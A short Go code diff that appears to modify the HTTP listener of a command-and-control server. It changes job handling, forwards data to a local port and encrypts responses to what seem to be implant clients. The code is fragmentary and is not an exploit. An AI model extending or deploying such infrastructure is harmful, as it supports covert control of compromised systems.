@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"math"
 	"math/big"
 	"net"
 	"net/http"
@@ -40,7 +41,7 @@ func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bo
 	}
 }
 
-func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, bool) {
+func POST_handler(body []byte, listener *Listener, r *http.Request, w http.ResponseWriter) ([]byte, bool) {
 
 	var res []byte
 	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
@@ -96,7 +97,11 @@ func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, boo
 					return ReverseBytes(res), true
 				}
 			} else {
-
+				remove_job(listener, i)
+				json_byte = append(json_byte, 0x00, IntToUint8(i))
+				Send_Bytes_to(w, json_byte, "http://localhost:50049", expectedHeaders)
+				res = append(res, make_fucker(listener, i)...)
+				res = eAES.EncryptData(res)
 				return res, true // commit
 			}
 
@@ -151,4 +156,13 @@ func Debug_ip(listener *Listener, ip string) {
 		}
 	}
 
+}
+
+func IntToUint8(num int) uint8 {
+	// 检查是否溢出
+	if num < 0 || num > math.MaxUint8 {
+		return 0
+	}
+
+	return uint8(num)
 }
